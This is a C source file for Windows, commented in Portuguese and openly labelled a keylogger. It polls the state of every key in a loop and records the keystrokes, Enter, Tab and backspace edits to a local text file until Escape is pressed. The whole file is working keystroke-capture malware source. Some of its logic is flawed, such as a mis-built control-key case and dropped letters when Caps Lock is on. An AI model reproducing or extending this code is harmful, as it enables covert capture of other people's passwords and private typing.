//////////////////
//Keylogger em C//
//////////////////

#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <winuser.h>


int main(){
    
    int key;
    int capital = 0;
    long int tamanho;
    int pressshift = 0;
    

    //DEFINE arquivo = FILE

    FILE *arquivo;

    //CRIA O ARQV SOMENTE PARA ESCRITA

    arquivo = fopen("Keylogger.txt", "w");

    //ESCREVE DADOS NO ARQV
    while (1) {
        Sleep(10); // 10ms PARA ENVIAR AS TECLAS

        // VERIFICA A TECLA
        for (key = 0; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {  

                    tamanho = ftell(arquivo);              

                switch (key){
                    case VK_SPACE: //ESPAÇO
                        fprintf(arquivo, " ");
                        continue;
                
                    case VK_RETURN: // ENTER
                        fprintf(arquivo, "\n[ENTER]");
                        break;

                    case VK_CAPITAL: //CAPSLOCK
                        capital = !capital;
                        continue;
                    case VK_SHIFT:
                        pressshift = 1;
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        pressshift = 1;
                        continue;
                    case VK_LCONTROL | VK_RCONTROL:
                        continue;
                    case VK_LMENU: // ALT
                        continue;
                    case VK_RMENU: //ALTGR
                        continue;
                    case VK_TAB:
                        fprintf(arquivo, "\n[TAB]");
                        continue;
                    case VK_BACK: //BACKSPACE = APAGAR
                        fseek(arquivo, -1, SEEK_END);
                        _chsize(_fileno(arquivo), tamanho - 1);
                        continue;
                    case VK_ESCAPE:
                        fprintf(arquivo, "\n[ESC]");
                        continue;

                    /* Caracteres especiais EM FASE AINDA
                    case VK_OEM_COMMA:
                        if (pressshift == 0) {
                            fprintf(arquivo, ",");
                        } else {
                            fprintf(arquivo, "<");
                        }
                        continue;
                    case VK_OEM_PERIOD:
                        if (pressshift == 0) {
                            fprintf(arquivo, ".");
                        } else {
                            fprintf(arquivo, ">");
                        }
                        continue;
                    case VK_OEM_1:
                        if (pressshift == 0 || capital == 0) {
                            fprintf(arquivo, "ç");
                        } else {
                            fprintf(arquivo, "Ç");
                        }
                        continue;
                    case VK_OEM_2:
                        if (pressshift == 0) {
                            fprintf(arquivo, "/");
                        } else {
                            fprintf(arquivo, "?");
                        }
                        continue;
                    case VK_OEM_3:
                        if (pressshift == 0) {
                            fprintf(arquivo, "´");
                        } else {
                            fprintf(arquivo, "`");
                        }
                        continue;
                    case VK_OEM_4:
                        if (pressshift == 0) {
                            fprintf(arquivo, "´");
                        } else {
                            fprintf(arquivo, "`");
                        }
                        continue;
                    case VK_OEM_5:
                        if (pressshift == 0) {
                            fprintf(arquivo, "]");
                        } else {
                            fprintf(arquivo, "}");
                        }
                        continue;
                    case VK_OEM_6:
                        if (pressshift == 0) {
                            fprintf(arquivo, "[");
                        } else {
                            fprintf(arquivo, "{");
                        }
                        continue;
                    case VK_OEM_MINUS:
                        if (pressshift == 0) {
                            fprintf(arquivo, "-");
                        } else {
                            fprintf(arquivo, "_");
                        }
                        continue;
                    case VK_OEM_PLUS:
                        if (pressshift == 0) {
                            fprintf(arquivo, "=");
                        } else {
                            fprintf(arquivo, "+");
                        }
                        continue;
                    */
                }

                if (capital == 0){
                    //MIN
                    key = tolower(key);
                    fprintf(arquivo, "%c", key);
                } else {
                    if (pressshift)
                    //MAIUS
                    fprintf(arquivo, "%c", key);
                }

                pressshift = 0; // Resetar o estado do shift

            }
        }

        //PARA O PROGRAMA
        if (GetAsyncKeyState(VK_ESCAPE)) {
            break;
        }
    }
    fclose(arquivo);
    return 0;
}
